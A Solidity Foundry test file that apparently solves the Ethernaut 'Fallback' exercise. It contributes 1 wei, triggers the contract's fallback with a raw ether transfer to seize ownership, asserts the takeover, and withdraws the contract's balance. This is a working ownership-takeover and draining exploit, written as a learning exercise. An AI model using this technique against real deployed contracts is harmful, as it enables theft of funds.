//SPDX-Licence-Identifier:MIT

pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {Fallback} from "../src/FallBack.sol";
import {console} from "forge-std/console.sol";

contract FallbackTest is Test {
        Fallback public FallbackContract;
        address public Owner = address(0x1234);
        address public attacker = address(0x5678);

        function setUp() public {
                
                vm.deal (attacker ,1 ether);

                vm.startPrank(Owner);
                FallbackContract = new Fallback();
                vm.stopPrank();


        }

        function testVisibilityExploit() public {

                vm.startPrank(attacker);

                //phase 1 : contribute to the contract

                FallbackContract.contribute{value: 1 wei}();

                //phase 2: trigger the fallback function 

                (bool success,) = address(FallbackContract).call{value: 1 wei}("");
                require(success , "Failed to call the fallback function");

                //phase 3: check the owner of the contract

                assertEq(FallbackContract.owner() , attacker);

                uint256 initialBalance  = attacker.balance;
                console.log("Initial balance of the attacker: ", initialBalance);
                console.log("Initial balance of the contract :", address(FallbackContract).balance);

                //phase 4: withdraw the balance

                FallbackContract.withdraw();

                uint256 finalBalance = attacker.balance;
                console.log("Final balance of the attacker: ", finalBalance);
                console.log("Final balance of the contract :", address(FallbackContract).balance);

        }

}
